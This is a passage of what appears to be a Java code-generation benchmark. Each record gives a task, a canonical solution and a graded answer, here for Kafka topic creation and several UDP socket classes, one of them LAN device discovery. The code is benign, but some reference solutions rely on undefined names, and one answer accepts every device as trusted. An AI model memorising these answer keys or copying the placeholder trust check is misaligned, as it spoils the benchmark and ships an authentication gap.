    "Instruction": "Task Description: Create a Kafka topic using the AdminClient API in Java.\n\nFunction Description: This function creates a new Kafka topic with the specified name, number of partitions, and replication factor. It uses the Kafka AdminClient to interact with the Kafka broker and handles potential exceptions during the topic creation process.\n\nInput: \n- topic: String - The name of the Kafka topic to be created.\n\nOutput: \n- void - The function does not return any value but creates the topic in Kafka and stores the AdminClient instance in the class field.\n\nExceptions:\n- InterruptedException: If the thread is interrupted while waiting for the topic creation to complete.\n- ExecutionException: If the topic creation fails during execution.\n- TimeoutException: If the topic creation takes longer than the specified timeout period.",
    "Canonical_solution": "import org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.NewTopic;\nimport java.util.Collection;\nimport java.util.Collections;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.TimeoutException;\nimport wiremock.com.google.common.collect.ImmutableMap;\n\nprivate AdminClient adminClient;\n\nprivate void createTopic(String topic) throws InterruptedException, ExecutionException, TimeoutException {\n    AdminClient adminClient = AdminClient\n        .create(ImmutableMap.of(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG, kafkaContainer.getBootstrapServers()));\n    Collection<NewTopic> topics = Collections.singletonList(new NewTopic(topic, 3, (short) 1));\n    adminClient.createTopics(topics).all().get(30, TimeUnit.SECONDS);\n    this.adminClient = adminClient;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 34,
    "right_result": "```java\nimport org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.NewTopic;\nimport org.apache.kafka.common.config.ConfigException;\n\nimport java.time.Duration;\nimport java.util.Collections;\nimport java.util.Properties;\nimport java.util.concurrent.ExecutionException;\n\npublic class KafkaTopicCreator {\n\n    private AdminClient adminClient;\n\n    public KafkaTopicCreator(String bootstrapServers) {\n        Properties props = new Properties();\n        props.put(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n        this.adminClient = AdminClient.create(props);\n    }\n\n    public void createTopic(String topic, int numPartitions, short replicationFactor)\n            throws InterruptedException, ExecutionException, TimeoutException {\n        NewTopic newTopic = new NewTopic(topic, numPartitions, replicationFactor);\n        adminClient.createTopics(Collections.singletonList(newTopic))\n                   .all()\n                   .get(Duration.ofSeconds(30));\n    }\n\n    public void close() {\n        if (adminClient != null) {\n            adminClient.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 600,
    "Instruction": "Task Description: Create a Java class for UDP socket communication that can be used for both sending and receiving datagram packets. The class should handle socket creation, binding, message transmission, and reception with proper error handling.\n\nClass Description: HTTPUSocket is a UDP socket wrapper class that provides simplified methods for UDP communication. It manages socket lifecycle and provides methods for sending messages to specific addresses and receiving incoming packets.\n\nAttributes:\n- ssdpUniSock: DatagramSocket - The underlying UDP socket for communication\n- localAddr: String - The local address bound to the socket\n\nMethods:\n- HTTPUSocket() -> void - Default constructor that creates an unbound UDP socket\n- HTTPUSocket(String bindAddr, int bindPort) -> void - Constructor that binds socket to specific address and port\n- HTTPUSocket(int bindPort) -> void - Constructor that binds socket to specific port on all interfaces\n- getDatagramSocket() -> DatagramSocket - Returns the underlying DatagramSocket instance\n- setLocalAddress(String addr) -> void - Sets the local address manually\n- getLocalAddress() -> String - Returns the local address bound to the socket\n- open() -> boolean - Creates an unbound UDP socket, returns success status\n- open(String bindAddr, int bindPort) -> boolean - Binds socket to specific address and port, returns success status\n- open(int bindPort) -> boolean - Binds socket to specific port on all interfaces, returns success status\n- close() -> boolean - Closes the socket, returns success status\n- post(String addr, int port, String msg) -> boolean - Sends a message to specified address and port, returns success status\n- receive() -> SSDPPacket - Receives an incoming packet and returns it wrapped in SSDPPacket object",
    "Canonical_solution": "import java.net.BindException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\n\npublic class HTTPUSocket {\n\n    private DatagramSocket ssdpUniSock = null;\n    private String localAddr = \"\";\n\n    public HTTPUSocket() {\n        open();\n    }\n\n    public HTTPUSocket(String bindAddr, int bindPort) throws BindException {\n        open(bindAddr, bindPort);\n    }\n\n    public HTTPUSocket(int bindPort) {\n        open(bindPort);\n    }\n\n    public DatagramSocket getDatagramSocket() {\n        return ssdpUniSock;\n    }\n\n    public void setLocalAddress(String addr) {\n        localAddr = addr;\n    }\n\n    public String getLocalAddress() {\n        if (0 < localAddr.length())\n            return localAddr;\n        return ssdpUniSock.getLocalAddress().getHostAddress();\n    }\n\n    public boolean open() {\n        close();\n        try {\n            ssdpUniSock = new DatagramSocket();\n        }\n        catch (Exception e) {\n            return false;\n        }\n        return true;\n    }\n\n    public boolean open(String bindAddr, int bindPort) throws BindException {\n        close();\n        try {\n            InetSocketAddress bindInetAddr = new InetSocketAddress(InetAddress.getByName(bindAddr), bindPort);\n            ssdpUniSock = new DatagramSocket(bindInetAddr);\n        }\n        catch (BindException possible) {\n            throw possible;\n        }\n        catch (Exception e) {\n            return false;\n        }\n        setLocalAddress(bindAddr);\n        return true;\n    }\n\n    public boolean open(int bindPort) {\n        close();\n        try {\n            InetSocketAddress bindSock = new InetSocketAddress(bindPort);\n            ssdpUniSock = new DatagramSocket(null);\n            ssdpUniSock.setReuseAddress(true);\n            ssdpUniSock.bind(bindSock);\n        }\n        catch (Exception e) {\n            return false;\n        }\n        return true;\n    }\n\n    public boolean close() {\n        if (ssdpUniSock == null)\n            return true;\n        try {\n            ssdpUniSock.close();\n            ssdpUniSock = null;\n        }\n        catch (Exception e) {\n            return false;\n        }\n        return true;\n    }\n\n    public boolean post(String addr, int port, String msg) {\n        try {\n            InetAddress inetAddr = InetAddress.getByName(addr);\n            DatagramPacket dgmPacket = new DatagramPacket(msg.getBytes(), msg.length(), inetAddr, port);\n            ssdpUniSock.send(dgmPacket);\n        }\n        catch (Exception e) {\n            return false;\n        }\n        return true;\n    }\n\n    public SSDPPacket receive() {\n        byte ssdvRecvBuf[] = new byte[SSDP.RECV_MESSAGE_BUFSIZE];\n        SSDPPacket recvPacket = new SSDPPacket(ssdvRecvBuf, ssdvRecvBuf.length);\n        recvPacket.setLocalAddress(getLocalAddress());\n        try {\n            ssdpUniSock.receive(recvPacket.getDatagramPacket());\n            recvPacket.setTimeStamp(System.currentTimeMillis());\n        }\n        catch (Exception e) {\n            return null;\n        }\n        return recvPacket;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.*;\nimport java.io.IOException;\n\npublic class HTTPUSocket {\n    private DatagramSocket ssdpUniSock;\n    private String localAddr = \"0.0.0.0\";\n\n    public HTTPUSocket() {\n        try {\n            ssdpUniSock = new DatagramSocket();\n        } catch (SocketException e) {\n            ssdpUniSock = null;\n        }\n    }\n\n    public HTTPUSocket(String bindAddr, int bindPort) {\n        try {\n            ssdpUniSock = new DatagramSocket(bindPort, InetAddress.getByName(bindAddr));\n            localAddr = bindAddr;\n        } catch (SocketException | UnknownHostException e) {\n            ssdpUniSock = null;\n        }\n    }\n\n    public HTTPUSocket(int bindPort) {\n        try {\n            ssdpUniSock = new DatagramSocket(bindPort);\n        } catch (SocketException e) {\n            ssdpUniSock = null;\n        }\n    }\n\n    public DatagramSocket getDatagramSocket() {\n        return ssdpUniSock;\n    }\n\n    public void setLocalAddress(String addr) {\n        this.localAddr = addr;\n    }\n\n    public String getLocalAddress() {\n        return localAddr;\n    }\n\n    public boolean open() {\n        try {\n            if (ssdpUniSock == null || ssdpUniSock.isClosed()) {\n                ssdpUniSock = new DatagramSocket();\n                return true;\n            }\n        } catch (SocketException e) {\n            return false;\n        }\n        return false;\n    }\n\n    public boolean open(String bindAddr, int bindPort) {\n        try {\n            if (ssdpUniSock == null || ssdpUniSock.isClosed()) {\n                ssdpUniSock = new DatagramSocket(bindPort, InetAddress.getByName(bindAddr));\n                localAddr = bindAddr;\n                return true;\n            }\n        } catch (SocketException | UnknownHostException e) {\n            return false;\n        }\n        return false;\n    }\n\n    public boolean open(int bindPort) {\n        try {\n            if (ssdpUniSock == null || ssdpUniSock.isClosed()) {\n                ssdpUniSock = new DatagramSocket(bindPort);\n                return true;\n            }\n        } catch (SocketException e) {\n            return false;\n        }\n        return false;\n    }\n\n    public boolean close() {\n        if (ssdpUniSock != null && !ssdpUniSock.isClosed()) {\n            ssdpUniSock.close();\n            return true;\n        }\n        return false;\n    }\n\n    public boolean post(String addr, int port, String msg) {\n        if (ssdpUniSock == null || ssdpUniSock.isClosed()) {\n            return false;\n        }\n        try {\n            byte[] buffer = msg.getBytes();\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, InetAddress.getByName(addr), port);\n            ssdpUniSock.send(packet);\n            return true;\n        } catch (IOException e) {\n            return false;\n        }\n    }\n\n    public SSDPPacket receive() {\n        if (ssdpUniSock == null || ssdpUniSock.isClosed()) {\n            return null;\n        }\n        byte[] buffer = new byte[65535];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        try {\n            ssdpUniSock.receive(packet);\n            return new SSDPPacket(packet.getData(), 0, packet.getLength(), packet.getAddress().getHostAddress(), packet.getPort());\n        } catch (IOException e) {\n            return null;\n        }\n    }\n}\n\nclass SSDPPacket {\n    private final byte[] data;\n    private final int length;\n    private final String address;\n    private final int port;\n\n    public SSDPPacket(byte[] data, int offset, int length, String address, int port) {\n        this.data = new byte[length];\n        System.arraycopy(data, offset, this.data, 0, length);\n        this.length = length;\n        this.address = address;\n        this.port = port;\n    }\n\n    public byte[] getData() {\n        return data;\n    }\n\n    public int getLength() {\n        return length;\n    }\n\n    public String getAddress() {\n        return address;\n    }\n\n    public int getPort() {\n        return port;\n    }\n}\n```"
  },
  {
    "Task_id": 601,
    "Instruction": "Task Description: Create a Java class that implements UDP communication functionality for sending and receiving packets, with configurable buffer size and port management.\n\nClass Description: The SnmpUdpHandler class provides UDP network communication capabilities for both sending and receiving datagram packets. It encapsulates the Java DatagramSocket functionality with additional convenience methods for packet handling and resource management.\n\nAttributes:\n- socket: DatagramSocket - The underlying UDP socket used for communication\n- bufferSize: int - The size of the buffer used for receiving packets (default 1024)\n- address: InetAddress - The IP address the socket is bound to\n- port: int - The port number the socket is bound to\n\nMethods:\n- SnmpUdpHandler(int port, InetAddress address) -> void - Constructor that initializes the UDP socket bound to the specified port and address\n- sendPacket(byte[] data, InetAddress destination, int destPort) -> void - Sends a UDP packet containing the specified data to the given destination address and port\n- receivePacket() -> byte[] - Receives a UDP packet and returns its data as a byte array\n- close() -> void - Closes the UDP socket and releases system resources\n- getPort() -> int - Returns the local port number the socket is bound to\n- setBufferSize(int size) -> void - Sets the buffer size used for receiving packets",
    "Canonical_solution": "import java.net.DatagramSocket;\nimport java.net.DatagramPacket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\nimport java.io.IOException;\n\npublic class SnmpUdpHandler {\n\n    private DatagramSocket socket;\n    private int bufferSize = 1024;\n    private InetAddress address;\n    private int port;\n\n    public SnmpUdpHandler(int port, InetAddress address) throws SocketException {\n        this.port = port;\n        this.address = address;\n        this.socket = new DatagramSocket(port, address);\n    }\n\n    public void sendPacket(byte[] data, InetAddress destination, int destPort) throws IOException {\n        DatagramPacket packet = new DatagramPacket(data, data.length, destination, destPort);\n        socket.send(packet);\n    }\n\n    public byte[] receivePacket() throws IOException {\n        byte[] buffer = new byte[bufferSize];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        socket.receive(packet);\n        return packet.getData();\n    }\n\n    public void close() {\n        if (socket != null) {\n            socket.close();\n        }\n    }\n\n    public int getPort() {\n        return socket != null ? socket.getLocalPort() : port;\n    }\n\n    public void setBufferSize(int size) {\n        this.bufferSize = size;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class SnmpUdpHandler {\n    private DatagramSocket socket;\n    private int bufferSize = 1024;\n    private InetAddress address;\n    private int port;\n\n    public SnmpUdpHandler(int port, InetAddress address) throws Exception {\n        this.socket = new DatagramSocket(port, address);\n        this.address = address;\n        this.port = this.socket.getLocalPort();\n    }\n\n    public void sendPacket(byte[] data, InetAddress destination, int destPort) throws Exception {\n        DatagramPacket packet = new DatagramPacket(data, data.length, destination, destPort);\n        socket.send(packet);\n    }\n\n    public byte[] receivePacket() throws Exception {\n        byte[] buffer = new byte[bufferSize];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        socket.receive(packet);\n        byte[] receivedData = new byte[packet.getLength()];\n        System.arraycopy(buffer, 0, receivedData, 0, packet.getLength());\n        return receivedData;\n    }\n\n    public void close() {\n        if (socket != null && !socket.isClosed()) {\n            socket.close();\n        }\n    }\n\n    public int getPort() {\n        return port;\n    }\n\n    public void setBufferSize(int size) {\n        this.bufferSize = size;\n    }\n}\n```"
  },
  {
    "Task_id": 602,
    "Instruction": "Task Description: Create a UDP server class that listens for incoming packets on a specified port, processes the received data, and provides a method to retrieve the received message.\n\nClass Description: The UdpServer class implements a Runnable interface to handle UDP communication asynchronously. It creates a datagram socket bound to a specified port, receives incoming packets, stores the message content, and allows retrieval of the received message. The server operates with a timeout of 60 seconds.\n\nAttributes:\n- serverSocket: DatagramSocket - The UDP socket used for communication\n- message: String - Stores the received message from the client\n\nMethods:\n- UdpServer(int port) -> void - Constructor that initializes the UDP server on the specified port and starts the receiver thread\n- run() -> void - The thread's main execution method that receives incoming packets and processes the data\n- getMessage() -> String - Retrieves the received message after processing",
    "Canonical_solution": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.SocketException;\nimport java.io.IOException;\n\npublic class UdpServer implements Runnable {\n\n    private final DatagramSocket serverSocket;\n    private String message;\n\n    public UdpServer(int port) throws SocketException, InterruptedException {\n        serverSocket = new DatagramSocket(port);\n        serverSocket.setSoTimeout(60000);\n        final Thread thread = new Thread(this);\n        thread.setDaemon(true);\n        thread.start();\n    }\n\n    @Override\n    public synchronized void run() {\n        final byte[] data = new byte[1024];\n        final DatagramPacket packet = new DatagramPacket(data, data.length);\n        try {\n            serverSocket.receive(packet);\n            message = new String(packet.getData()).trim();\n        } catch (IOException e) {\n            message = \"Exception while receiving sentry call. \" + e.getMessage();\n        }\n    }\n\n    public synchronized String getMessage() throws InterruptedException {\n        return message;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\n\npublic class UdpServer implements Runnable {\n    private final DatagramSocket serverSocket;\n    private String message;\n    private final int port;\n\n    public UdpServer(int port) {\n        this.port = port;\n        try {\n            this.serverSocket = new DatagramSocket(port);\n            this.serverSocket.setSoTimeout(60000);\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to initialize UDP server\", e);\n        }\n        new Thread(this).start();\n    }\n\n    @Override\n    public void run() {\n        byte[] buffer = new byte[1024];\n        while (true) {\n            try {\n                DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n                serverSocket.receive(packet);\n                message = new String(packet.getData(), 0, packet.getLength());\n            } catch (Exception e) {\n                break;\n            }\n        }\n        serverSocket.close();\n    }\n\n    public String getMessage() {\n        return message;\n    }\n}\n```"
  },
  {
    "Task_id": 603,
    "Instruction": "Task Description: Implement a class that provides UDP-based network communication for device discovery and identity exchange in a local area network (LAN) environment, supporting both server (listener) and client (broadcaster) functionalities.\n\nClass Description: LanLinkProvider is a class that handles UDP communication for device discovery in a LAN. It listens for identity broadcasts from other devices and broadcasts its own identity. It manages socket creation, packet handling, and network trust verification.\n\nAttributes:\n- context: [Context] - Android context for accessing device information and preferences\n- udpServer: [DatagramSocket] - UDP socket for receiving broadcast packets\n- listening: [boolean] - Flag indicating whether the UDP listener is active\n- UDP_PORT: [static final int] - Default UDP port for communication (1716)\n- MIN_PORT: [static final int] - Minimum valid TCP port number (1716)\n- MAX_UDP_PACKET_SIZE: [static final int] - Maximum size of UDP packets (512KB)\n\nMethods:\n- setupUdpListener() -> [void] - Sets up and starts a UDP listener thread that continuously receives packets\n- udpPacketReceived(DatagramPacket packet) -> [void] - Processes received UDP packets containing device identity information\n- sendUdpIdentityPacket(List<InetAddress> ipList, @Nullable Network network) -> [void] - Broadcasts device identity to specified IP addresses\n- configureSocket(Socket socket) -> [void] - Configures socket settings (keep-alive)\n- isDeviceTrusted(String deviceId) -> [boolean] - Checks if a device is marked as trusted in shared preferences\n- onStart() -> [void] - Starts the UDP listener\n- onStop() -> [void] - Stops the UDP listener and cleans up resources",
    "Canonical_solution": "import android.content.Context;\nimport android.net.Network;\nimport android.os.Build;\nimport android.util.Log;\n\nimport org.json.JSONException;\nimport org.kde.kdeconnect.Helpers.ThreadHelper;\nimport org.kde.kdeconnect.NetworkPacket;\nimport org.kde.kdeconnect.Helpers.DeviceHelper;\nimport org.kde.kdeconnect.Helpers.TrustedNetworkHelper;\n\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\nimport java.util.ArrayList;\nimport java.util.List;\n\nimport kotlin.text.Charsets;\n\npublic class LanLinkProvider {\n\n    final static int UDP_PORT = 1716;\n    final static int MIN_PORT = 1716;\n    final static int MAX_UDP_PACKET_SIZE = 1024 * 512;\n\n    private final Context context;\n    private DatagramSocket udpServer;\n    private boolean listening = false;\n\n    private void setupUdpListener() {\n        try {\n            udpServer = new DatagramSocket(null);\n            udpServer.setReuseAddress(true);\n            udpServer.setBroadcast(true);\n        } catch (SocketException e) {\n            Log.e(\"LanLinkProvider\", \"Error creating udp server\", e);\n            throw new RuntimeException(e);\n        }\n        try {\n            udpServer.bind(new InetSocketAddress(UDP_PORT));\n        } catch (SocketException e) {\n            Log.e(\"LanLinkProvider\", \"Error binding udp server\", e);\n        }\n        ThreadHelper.execute(() -> {\n            Log.i(\"UdpListener\", \"Starting UDP listener\");\n            while (listening) {\n                try {\n                    DatagramPacket packet = new DatagramPacket(new byte[MAX_UDP_PACKET_SIZE], MAX_UDP_PACKET_SIZE);\n                    udpServer.receive(packet);\n                    ThreadHelper.execute(() -> {\n                        try {\n                            udpPacketReceived(packet);\n                        } catch (JSONException | IOException e) {\n                            Log.e(\"LanLinkProvider\", \"Exception receiving UDP packet\", e);\n                        }\n                    });\n                } catch (IOException e) {\n                    Log.e(\"LanLinkProvider\", \"UdpReceive exception\", e);\n                }\n            }\n            Log.w(\"UdpListener\", \"Stopping UDP listener\");\n        });\n    }\n\n    @WorkerThread\n    private void udpPacketReceived(DatagramPacket packet) throws JSONException, IOException {\n        final InetAddress address = packet.getAddress();\n        String message = new String(packet.getData(), Charsets.UTF_8);\n        final NetworkPacket identityPacket = NetworkPacket.unserialize(message);\n\n        if (!DeviceInfo.isValidIdentityPacket(identityPacket)) {\n            Log.w(\"KDE/LanLinkProvider\", \"Invalid identity packet\");\n            return;\n        }\n\n        final String deviceId = identityPacket.getString(\"deviceId\");\n        String myId = DeviceHelper.getDeviceId(context);\n        if (deviceId.equals(myId)) {\n            return;\n        }\n\n        Log.i(\"KDE/LanLinkProvider\", \"Broadcast received from \" + identityPacket.getString(\"deviceName\"));\n\n        boolean deviceTrusted = isDeviceTrusted(identityPacket.getString(\"deviceId\"));\n        if (!deviceTrusted && !TrustedNetworkHelper.isTrustedNetwork(context)) {\n            Log.i(\"KDE/LanLinkProvider\", \"Ignoring untrusted device\");\n            return;\n        }\n\n        int tcpPort = identityPacket.getInt(\"tcpPort\", MIN_PORT);\n        if (tcpPort < MIN_PORT || tcpPort > MAX_PORT) {\n            Log.e(\"LanLinkProvider\", \"Invalid TCP port\");\n            return;\n        }\n\n        Socket socket = SocketFactory.getDefault().createSocket(address, tcpPort);\n        configureSocket(socket);\n\n        DeviceInfo myDeviceInfo = DeviceHelper.getDeviceInfo(context);\n        NetworkPacket myIdentity = myDeviceInfo.toIdentityPacket();\n\n        OutputStream out = socket.getOutputStream();\n        out.write(myIdentity.serialize().getBytes());\n        out.flush();\n    }\n\n    @WorkerThread\n    public void sendUdpIdentityPacket(List<InetAddress> ipList, @Nullable Network network) {\n        if (!listening) return;\n\n        DeviceInfo myDeviceInfo = DeviceHelper.getDeviceInfo(context);\n        NetworkPacket identity = myDeviceInfo.toIdentityPacket();\n        identity.set(\"tcpPort\", MIN_PORT);\n\n        byte[] bytes;\n        try {\n            bytes = identity.serialize().getBytes(Charsets.UTF_8);\n        } catch (JSONException e) {\n            Log.e(\"KDE/LanLinkProvider\", \"Failed to serialize packet\", e);\n            return;\n        }\n\n        DatagramSocket socket;\n        try {\n            socket = new DatagramSocket();\n            if (network != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {\n                try {\n                    network.bindSocket(socket);\n                } catch (IOException e) {\n                    Log.w(\"LanLinkProvider\", \"Network bind failed\");\n                }\n            }\n            socket.setReuseAddress(true);\n            socket.setBroadcast(true);\n        } catch (SocketException e) {\n            Log.e(\"KDE/LanLinkProvider\", \"Failed to create socket\", e);\n            return;\n        }\n\n        for (InetAddress ip : ipList) {\n            try {\n                socket.send(new DatagramPacket(bytes, bytes.length, ip, MIN_PORT));\n            } catch (IOException e) {\n                Log.e(\"KDE/LanLinkProvider\", \"Send failed to \" + ip, e);\n            }\n        }\n        socket.close();\n    }\n\n    private void configureSocket(Socket socket) {\n        try {\n            socket.setKeepAlive(true);\n        } catch (SocketException e) {\n            Log.e(\"LanLink\", \"Socket config failed\", e);\n        }\n    }\n\n    private boolean isDeviceTrusted(String deviceId) {\n        return context.getSharedPreferences(\"trusted_devices\", Context.MODE_PRIVATE)\n                     .getBoolean(deviceId, false);\n    }\n\n    public void onStart() {\n        if (!listening) {\n            listening = true;\n            setupUdpListener();\n        }\n    }\n\n    public void onStop() {\n        listening = false;\n        if (udpServer != null) {\n            udpServer.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport android.content.Context;\nimport android.net.Network;\nimport android.net.nsd.NsdManager;\n\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.SocketException;\nimport java.util.List;\n\npublic class LanLinkProvider {\n    private Context context;\n    private DatagramSocket udpServer;\n    private boolean listening;\n    public static final int UDP_PORT = 1716;\n    public static final int MIN_PORT = 1716;\n    public static final int MAX_UDP_PACKET_SIZE = 512 * 1024; // 512KB\n\n    public LanLinkProvider(Context context) {\n        this.context = context;\n    }\n\n    void setupUdpListener() {\n        new Thread(() -> {\n            try {\n                udpServer = new DatagramSocket(new InetSocketAddress(UDP_PORT));\n                configureSocket(udpServer);\n                byte[] buffer = new byte[MAX_UDP_PACKET_SIZE];\n                while (listening) {\n                    DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n                    udpServer.receive(packet);\n                    if (!listening) break;\n                    udpPacketReceived(packet);\n                }\n            } catch (SocketException e) {\n                if (!listening) return;\n                e.printStackTrace();\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                if (udpServer != null && !udpServer.isClosed()) {\n                    udpServer.close();\n                }\n            }\n        }).start();\n    }\n\n    void udpPacketReceived(DatagramPacket packet) {\n        String receivedData = new String(packet.getData(), 0, packet.getLength());\n        InetAddress senderAddress = packet.getAddress();\n        int senderPort = packet.getPort();\n\n        // Process identity data from the sender\n        // Example: extract device ID and check trust status\n        String deviceId = parseDeviceIdFrom(receivedData);\n        if (deviceId != null && isDeviceTrusted(deviceId)) {\n            // Handle trusted device\n        }\n    }\n\n    void sendUdpIdentityPacket(List<InetAddress> ipList, Network network) {\n        String identityMessage = buildIdentityMessage();\n        byte[] messageBytes = identityMessage.getBytes();\n        DatagramPacket packet = new DatagramPacket(messageBytes, messageBytes.length);\n\n        for (InetAddress address : ipList) {\n            try {\n                DatagramSocket socket = new DatagramSocket();\n                if (network != null) {\n                    socket.bind(new InetSocketAddress(network.getInterface().getName(), 0));\n                }\n                configureSocket(socket);\n                packet.setAddress(address);\n                packet.setPort(UDP_PORT);\n                socket.send(packet);\n                socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    void configureSocket(Socket socket) {\n        try {\n            socket.setKeepAlive(true);\n        } catch (SocketException e) {\n            e.printStackTrace();\n        }\n    }\n\n    boolean isDeviceTrusted(String deviceId) {\n        // Check shared preferences or database for device trust status\n        return true; // Placeholder logic\n    }\n\n    void onStart() {\n        listening = true;\n        setupUdpListener();\n    }\n\n    void onStop() {\n        listening = false;\n        if (udpServer != null && !udpServer.isClosed()) {\n            udpServer.close();\n        }\n    }\n\n    private String parseDeviceIdFrom(String data) {\n        // Implement parsing of device ID from the received string\n        return \"dummy_device_id\";\n    }\n\n    private String buildIdentityMessage() {\n        // Build a message containing device identity information\n        return \"DEVICE_ID=123456;MODEL=TestDevice;IP=192.168.1.1\";\n    }\n}\n```"
  },
  {
    "Task_id": 604,
    "Instruction": "Task Description: Implement a UDP client class in Java that can send UDP packets to a specified target address and port, with optional response waiting functionality.\n\nClass Description: The UDPClient class provides functionality to send UDP packets to a network target. It supports both fire-and-forget mode and request-response mode. The class manages its own socket and thread for asynchronous operation, and includes cleanup mechanisms.\n\nAttributes:\n- mUdpSocket: DatagramSocket - The UDP socket used for communication\n- mRunning: boolean - Flag indicating whether the client is currently active\n- mThread: Thread - The thread handling the UDP communication\n\nMethods:\n- sendUDPPacket(String targetAddress, int port, String data, boolean waitResponse, ResponseHandler handler) -> void - \n  Sends a UDP packet to the specified address and port. If waitResponse is true, it will wait for and deliver any response.\n  Parameters:\n    - targetAddress: String - The IP address or hostname of the target\n    - port: int - The destination port number\n    - data: String - The message to send\n    - waitResponse: boolean - Whether to wait for a response\n    - handler: ResponseHandler - Callback interface for handling responses or errors\n\n- stop() -> void - \n  Stops any ongoing UDP communication and cleans up resources. Closes the socket and interrupts the thread if active.\n\n- interface ResponseHandler - \n  Callback interface for handling responses or errors\n  Methods:\n    - onResponse(String response) -> void - Called when a response is received\n    - onError(String errorMessage) -> void - Called when an error occurs",
    "Canonical_solution": "import android.content.SharedPreferences;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.view.View.OnClickListener;\nimport android.widget.Button;\nimport android.widget.CheckBox;\nimport android.widget.EditText;\nimport android.widget.Spinner;\nimport android.widget.Toast;\nimport android.widget.ToggleButton;\n\nimport org.csploit.android.R;\nimport org.csploit.android.core.Plugin;\nimport org.csploit.android.core.System;\nimport org.csploit.android.net.Target;\nimport org.csploit.android.net.Target.Type;\n\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\n\npublic class UDPClient {\n\n    private DatagramSocket mUdpSocket = null;\n    private boolean mRunning = false;\n    private Thread mThread = null;\n\n    public void sendUDPPacket(String targetAddress, int port, String data, boolean waitResponse, final ResponseHandler handler) {\n        if (!mRunning) {\n            mRunning = true;\n\n            mThread = new Thread(new Runnable() {\n                @Override\n                public void run() {\n                    String error = null;\n                    try {\n                        mUdpSocket = new DatagramSocket();\n                        DatagramPacket packet = new DatagramPacket(\n                                data.getBytes(), data.length(),\n                                System.getCurrentTarget().getAddress(), port);\n\n                        mUdpSocket.send(packet);\n\n                        if (waitResponse) {\n                            byte[] buffer = new byte[1024];\n                            DatagramPacket response = new DatagramPacket(buffer, buffer.length);\n                            mUdpSocket.receive(response);\n                            final String responseText = new String(buffer);\n                            handler.onResponse(responseText);\n                        }\n                    } catch (Exception e) {\n                        error = e.getMessage();\n                    } finally {\n                        if (mUdpSocket != null) {\n                            mUdpSocket.close();\n                        }\n                        mRunning = false;\n                        if (error != null) {\n                            handler.onError(error);\n                        }\n                    }\n                }\n            });\n\n            mThread.start();\n        }\n    }\n\n    public void stop() {\n        mRunning = false;\n        try {\n            if (mThread != null && mThread.isAlive()) {\n                if (mUdpSocket != null)\n                    mUdpSocket.close();\n                mThread.interrupt();\n                mThread = null;\n            }\n        } catch (Exception e) {\n            // Ignore\n        }\n    }\n\n    public interface ResponseHandler {\n        void onResponse(String response);\n        void onError(String errorMessage);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.*;\nimport java.io.IOException;\n\npublic class UDPClient {\n    private DatagramSocket mUdpSocket;\n    private boolean mRunning = false;\n    private Thread mThread;\n\n    public interface ResponseHandler {\n        void onResponse(String response);\n        void onError(String errorMessage);\n    }\n\n    public void sendUDPPacket(String targetAddress, int port, String data, boolean waitResponse, ResponseHandler handler) {\n        try {\n            InetAddress address = InetAddress.getByName(targetAddress);\n            byte[] sendData = data.getBytes();\n            DatagramPacket sendPacket = new DatagramPacket(sendData, sendData.length, address, port);\n            if (mUdpSocket == null || !mUdpSocket.isBound()) {\n                mUdpSocket = new DatagramSocket();\n            }\n            mUdpSocket.send(sendPacket);\n\n            if (waitResponse) {\n                startListening(handler);\n            }\n        } catch (UnknownHostException e) {\n            handler.onError(\"Unknown host: \" + targetAddress);\n        } catch (IOException e) {\n            handler.onError(\"I/O error occurred: \" + e.getMessage());\n        }\n    }\n\n    private synchronized void startListening(final ResponseHandler handler) {\n        if (!mRunning) {\n            mRunning = true;\n            mThread = new Thread(() -> {\n                try {\n                    while (mRunning) {\n                        byte[] receiveData = new byte[1024];\n                        DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n                        mUdpSocket.receive(receivePacket);\n                        String response = new String(receivePacket.getData(), 0, receivePacket.getLength());\n                        handler.onResponse(response);\n                    }\n                } catch (IOException e) {\n                    if (mRunning) {\n                        